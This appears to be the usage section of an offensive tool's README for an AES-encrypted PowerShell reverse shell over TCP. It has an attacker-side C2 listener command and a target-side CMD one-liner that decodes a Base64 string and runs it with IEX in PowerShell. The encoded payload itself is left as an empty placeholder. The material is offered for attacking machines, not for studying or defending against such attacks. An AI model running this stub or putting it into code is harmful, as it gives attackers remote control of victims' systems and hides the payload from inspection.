
### Reverse Encrypted (AES 256-bit) Shell over TCP - using PowerShell SecureString. ###

- Attacker (C2-Server Listener):

PS> .\ReverseTCP.ps1

- Target (Client):

CMD> ECHO IEX(\[string]([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String({}))));Exit | PowerShell -
